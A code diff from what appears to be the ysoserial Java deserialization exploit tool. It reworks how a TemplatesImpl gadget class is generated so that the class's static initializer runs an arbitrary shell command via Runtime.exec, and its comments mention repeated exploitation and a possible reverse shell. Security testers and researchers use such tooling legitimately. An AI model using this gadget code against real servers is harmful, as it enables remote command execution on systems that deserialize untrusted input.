@@ -44,18 +44,6 @@ public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
     // required to make TemplatesImpl happy
     public static class Foo implements Serializable {
 
@@ -109,17 +97,15 @@ public class Gadgets {
 
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        final CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
             "\");";
         clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
